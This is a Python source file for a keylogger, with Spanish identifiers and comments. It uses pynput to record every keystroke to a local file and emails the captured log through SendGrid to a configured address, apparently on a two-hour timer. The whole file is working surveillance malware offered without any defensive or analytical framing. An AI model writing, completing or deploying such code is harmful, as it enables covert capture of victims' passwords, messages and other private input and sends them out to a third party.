import pynput.keyboard
import time
import threading
import sys
from threading import Timer
from datetime import datetime
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail

GUARDAR_CADA_SEGUNDOS = 10
ENVIAR_MAIL_SEGUNDOS = 7200  # 2 horas
FROM_EMAIL = 'from@gmail.com'
TO_EMAIL = 'to@gmail.com'
SENDGRID_API_KEY = 'SENGRID_API_KEY'
KEY = pynput.keyboard.Key
PATH = "pulsaciones_grabadas.txt"
PALABRA_SALIR = "byebye"


class main:
    def __init__(self):
        self.listener = pynput.keyboard.Listener(
            on_press=self.on_press, on_release=self.on_release)
        self.log = ""
        self.path = PATH
        self.running = False
        self.last_keypress = datetime.now()

    def start(self):
        self.listener.start()
        self.running = True

        while True:
            time.sleep(GUARDAR_CADA_SEGUNDOS)
            if not self.running:
                break
            if self.log != "":
                self.guardar()
                self.log = ""

    def parar(self):
        self.listener.stop()
        self.running = False
        threading.Thread.__init__(self.listener)
        sys.exit()

    def on_release(self, event):
        if event == KEY.esc:
            self.parar()

    def on_press(self, event):

        # Cuando el keylogger no detecta pulsaciones durante más de 5 minutos debe dar un salto de línea para la próxima vez que registre pulsaciones
        minutes_since_last_keypress = (
            datetime.now()-self.last_keypress).total_seconds() / 60.0
        if minutes_since_last_keypress > 1.0:
            self.log += "\n"
            self.last_keypress = datetime.now()

        if event == KEY.enter:
            self.log += "\n"
        elif event == KEY.tab:
            self.log += "[Tab]"
        elif event == KEY.backspace:
            self.log += "[backspace]"
        elif event == KEY.space:
            self.log += " "
        elif type(event) == KEY:
            self.log += ""
        else:
            self.log += str(event).replace("'", "")

        if PALABRA_SALIR in self.log:
            self.enviar()
            self.parar()

    def guardar(self):
        with open(self.path, "a", encoding="utf-8") as f:
            f.write(self.log)
        return True

    def enviar(self):
        file = open(self.path, "r")
        message = Mail(
            from_email=FROM_EMAIL,
            to_emails=TO_EMAIL,
            subject=f'Keylogger backup {datetime.now()}',
            html_content=file.read())
        try:
            sg = SendGridAPIClient(SENDGRID_API_KEY)
            response = sg.send(message)
            print(message)
        except Exception as e:
            return False

        timer = Timer(ENVIAR_MAIL_SEGUNDOS, self.enviar)
        timer.daemon = True
        timer.start()
        return True


if __name__ == "__main__":
    main = main()
    main.start()
